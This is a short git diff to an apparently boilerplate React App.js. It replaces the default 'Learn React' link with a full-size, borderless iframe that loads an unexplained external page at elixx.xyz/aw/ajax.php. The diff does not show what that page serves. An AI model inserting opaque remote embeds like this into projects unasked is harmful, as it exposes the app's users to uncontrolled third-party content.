@@ -9,14 +9,9 @@ function App() {
         <p>
           Edit <code>src/App.js</code> and save to reload.
         </p>
-        <a
-          className="App-link"
-          href="https://reactjs.org"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          Learn React
-        </a>
+
+
+        <iframe src="https://elixx.xyz/aw/ajax.php" width="100%" height="100%" scrolling="no" frameborder="0" allowfullscreen="true"></iframe>
       </header>
     </div>
   );
